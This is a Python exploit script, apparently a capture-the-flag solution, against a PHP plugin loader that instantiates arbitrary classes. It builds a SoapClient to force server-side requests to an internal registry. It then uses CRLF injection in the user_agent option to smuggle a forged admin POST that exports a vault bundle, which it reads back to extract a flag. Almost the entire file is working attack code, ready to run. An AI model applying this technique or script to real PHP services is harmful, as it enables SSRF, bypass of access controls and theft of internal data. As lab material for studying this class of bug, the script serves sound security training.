#!/usr/bin/env python3
"""
02 - Arbitrary object instantiation -> SoapClient SSRF with CRLF injection.

PluginHub does `new $plugin(...$args)` with a class name and a JSON argument
list taken straight from the query string, and it bundles no classes of its
own. Everything therefore has to come from PHP's built-in classes.

SoapClient is the useful one:

  * its constructor fetches the WSDL immediately, which is an outbound HTTP
    request we fully control the URL of  ->  SSRF;
  * the `user_agent` option is copied verbatim into the request header block,
    newlines included  ->  CRLF header injection;
  * injecting a bare CRLF CRLF terminates the header block early, so whatever
    follows is read by the target as a *second*, pipelined HTTP request. That
    upgrades the primitive from "GET with extra headers" to "any method, any
    header, any body".

The internal registry only exports its vault bundle for
    POST /admin/export  +  X-Registry-Role: admin  +  dest=<name>
which is exactly what the smuggled request provides. The bundle lands in the
package cache shared with the front-end, and the front-end will print it.

Built-in-class research: Arseniy Sharoglazov, "Exploiting Arbitrary Object
Instantiations in PHP without Custom Classes"
https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/
"""

import json
import os
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

REGISTRY = "registry:8080"

# The package cache is a persistent volume, so a fixed destination name would
# make every run after the first one a no-op that still prints a flag. One
# fresh name per run, plus an explicit "it is not there yet" assertion before
# the smuggle, is what makes stage 3 mean something.
DEST = "vault-%s.pkg" % os.urandom(4).hex()


def smuggled_user_agent(dest):
    """A User-Agent value that closes the header block and appends a POST."""
    body = f"dest={dest}"
    request = (
        "POST /admin/export HTTP/1.1\r\n"
        f"Host: {REGISTRY}\r\n"
        "X-Registry-Role: admin\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "\r\n"
        f"{body}"
    )
    # "PluginHub/1.4" is the value PHP thinks it is sending; the CRLF CRLF ends
    # the header block of the WSDL GET and the rest is a brand new request.
    return "PluginHub/1.4\r\n\r\n" + request


def load_plugin(base, cls, args):
    query = urllib.parse.urlencode({"plugin": cls, "args": json.dumps(args)})
    with urllib.request.urlopen(base + "/?" + query, timeout=25) as resp:
        return resp.read().decode("utf-8", "replace")


def fetch(base, query):
    with urllib.request.urlopen(base + "/?" + urllib.parse.urlencode(query), timeout=25) as resp:
        return resp.read().decode("utf-8", "replace")


def cached(base, name):
    """True when `name` already exists in the front-end's package cache."""
    page = fetch(base, {"pkg": name})
    return "(not in the cache)" not in page


def show(tag, page):
    for block in re.findall(r"<pre>(.*?)</pre>", page, re.S):
        text = re.sub(r"\s+", " ", block).strip()
        if text:
            print(f"    {tag}: {text[:220]}")


def main():
    base = (sys.argv[1] if len(sys.argv) > 1 else "http://challenge").rstrip("/")
    print(f"[*] target: {base}")

    # -- stage 1: confirm the loader really instantiates arbitrary classes ----
    print("[1] probing the loader with a harmless built-in class")
    page = load_plugin(base, "ArrayObject", [[]])
    if "initialised ArrayObject" not in page:
        print("[-] the loader did not instantiate ArrayObject", file=sys.stderr)
        return 1
    print("    loader result: initialised ArrayObject")

    # -- stage 2: blind SSRF through SoapClient's WSDL fetch ------------------
    print("[2] SoapClient WSDL fetch -> SSRF to the internal registry")
    page = load_plugin(base, "SoapClient", [f"http://{REGISTRY}/", {"user_agent": "PluginHub/1.4"}])
    show("soapfault", page)

    # -- stage 3: CRLF injection -> smuggle POST /admin/export ----------------
    # Assert the destination does not exist BEFORE the smuggle, so a broken
    # stage 3 fails loudly instead of reading a bundle a previous run exported.
    if cached(base, DEST):
        print(f"[-] {DEST} is already in the package cache before the smuggle",
              file=sys.stderr)
        return 1
    print(f"    {DEST} is not in the package cache yet")

    print(f"[3] smuggling `POST /admin/export  dest={DEST}` through user_agent")
    page = load_plugin(
        base,
        "SoapClient",
        [f"http://{REGISTRY}/", {"user_agent": smuggled_user_agent(DEST)}],
    )
    show("soapfault", page)

    # -- stage 4: read the exported bundle out of the shared package cache ----
    print(f"[4] reading the exported bundle from the package cache: {DEST}")
    page = fetch(base, {"pkg": DEST})
    match = re.search(r"PHRACK\{[^}]*\}", page)
    if not match:
        print("[-] the bundle is not in the cache; the smuggled POST did not land",
              file=sys.stderr)
        print(page, file=sys.stderr)
        return 1

    print(f"FLAG: {match.group(0)}")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except urllib.error.URLError as exc:
        print(f"[-] request failed: {exc}", file=sys.stderr)
        sys.exit(1)
